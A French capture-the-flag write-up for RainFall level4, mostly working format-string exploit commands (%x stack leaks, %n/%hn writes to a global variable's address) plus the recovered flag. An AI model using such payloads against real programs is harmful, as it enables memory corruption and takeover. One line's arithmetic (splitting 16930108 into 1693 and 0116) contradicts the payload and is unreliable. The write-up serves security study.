@@ -1,1 +1,51 @@
 python -c 'print "\x10\x98\x04\x08%16930112d%12$n"'
+
+Comme pour le niveau 3, nous allons voir si nous pouvons écrire à une adresse donnée en début de buffer
+level4@RainFall:~$ python -c 'print "AAAA" + " %x " * 20' | ./level4
+AAAA b7ff26b0  bffffd34  b7fd0ff4  0  0  bffffcf8  804848d  bffffaf0  200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520
+cela semble possible avec le 12ème formateur
+python -c 'print "AAAA" + "%12$n"' | ./level4
+=> essaiera d'assigner la valeur 4 à l'adresse 0x41414141
+
+Comme pour le niveau 3, on peut voir une comparaison d'une variable globale m avec un nombre
+ici la comparaison est entre m et 0x1025544
+on doit donc assigner la valeur 16930116 à la variable m
+grâce à la commande info variables de gdb on trouve l'adresse de m
+=> 0x08049810  m
+
+on imagine donc une payload de type : 
+python -c 'print "\x10\x98\x04\x08" + "A" * 16930112 + "%12$n"' | ./level4
+
+on a une erreur de broken pipe
+
+Heureusement, les formateurs de printf peuvent prendre en argument une valeure qui ajoutera du padding pour atteindre ce nombre de caractère affiché par l'argument
+
+De cette manière, on devrait pouvoir assigner la valeur 16930116 (4 + 16930112) à m
+python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
+
+C'est un nombre important de caractère, cela pourrait prendre beaucoup de temps.
+
+Une autre particularité du formatage de printf est la possibilité de lire/écrire bytes par bytes (%hhn) ou 2 bytes par 2 bytes (%hn) plutôt que 4 par 4 (%n)
+
+Ici on utilisera %hn pour écrire 2 bytes, 2 fois à 2 adresses espacées de 2 bytes
+
+pour découper 16930108 en 1693 (0x69d) et 0116 (0x74).
+
+les 8 bytes manquant correspondent à l'écriture des 2 adresses.
+
+l'adresse de m étant : 0x08049810
+
+on essaie d'écrire :
+
+258 à l'adresse 0x08049812
+21828 à l'adresse 0x08049810 
+258 => 250 (-8 bytes déjà écrits)
+21828 => 21570 (-258 bytes déjà écrits)
+donc un premier padding de 250 bytes parce que l'on retire les 2 * 4 bytes des adresses
+et un second padding de 21570 car l'on prend en compte les 258 bytes déjà écrit pour le premier %hn
+
+on obtient donc une payload:
+"\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"
+python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250x" + "%12$hn" + "%21570x" + "%13$hn"' | ./level4
+
+on obtient : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
